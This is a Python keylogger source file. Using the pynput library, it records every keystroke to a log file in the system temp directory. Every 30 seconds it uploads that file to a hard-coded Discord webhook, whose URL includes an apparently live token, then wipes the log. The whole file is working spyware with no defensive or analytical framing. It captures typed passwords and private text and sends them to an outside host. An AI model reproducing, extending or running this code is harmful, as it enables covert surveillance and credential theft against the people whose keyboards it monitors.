import os
import tempfile
import requests
import threading
from pynput import keyboard

# Create a temporary directory and a log file named "log.txt" within it
temp_dir = tempfile.gettempdir()
log_path = os.path.join(temp_dir, 'log.txt')

# Your Discord webhook URL
webhook_url = 'https://discord.com/api/webhooks/1272625926668292136/LL8hTxV9YTcY6Qkbc_KZhn2BXVufmLDGAbM0m1m28kbK8cvwlcakiwViAQtrMKO_BA95'

# Function to handle key press events
def on_press(key):
    try:
        with open(log_path, 'a') as f:
            f.write(f'{key.char}')
    except AttributeError:
        with open(log_path, 'a') as f:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            else:
                f.write(f'[{key}]')

# Function to handle key release events (optional)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Function to send the log file to Discord
def send_log_to_discord():
    try:
        with open(log_path, 'rb') as f:
            files = {
                'file': (os.path.basename(log_path), f)
            }
            response = requests.post(webhook_url, files=files)
            if response.status_code == 200:
                print('Log file sent successfully.')
            else:
                print(f'Failed to send log file. Status code: {response.status_code}')

        # Clear the log file
        open(log_path, 'w').close()

        # Schedule the next call to this function
        threading.Timer(30, send_log_to_discord).start()
    except RuntimeError as e:
        if 'interpreter shutdown' in str(e):
            print('Interpreter is shutting down, cannot start new thread.')
        else:
            raise

# Start the keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    # Start the periodic log sending
    send_log_to_discord()
    listener.join()

# Print the path to the temporary file
print(f'Keystrokes are being logged to: {log_path}')
